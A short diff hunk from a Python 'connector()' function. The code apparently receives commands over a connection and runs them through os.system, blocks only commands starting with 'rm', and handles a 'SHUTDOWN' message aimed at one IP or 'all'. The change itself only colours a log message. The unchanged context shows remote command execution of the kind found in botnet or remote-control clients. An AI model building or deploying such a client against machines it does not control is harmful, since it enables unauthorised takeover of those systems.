@@ -48,7 +48,7 @@ def connector():
                     if not data.split('$')[1].startswith('rm'):
                         os.system(data.split('$')[1])
                     else:
-                        print('Commanded Blocked: %s' % data.split('$')[1])
+                        print('\033[1;94m[ INFO ]\033[0m Commanded Blocked: %s' % data.split('$')[1])
                 elif 'SHUTDOWN$' in data:
                     print(data.split('$')[1])
                     # Check IP > if my IP >> do, if 'all' >> do
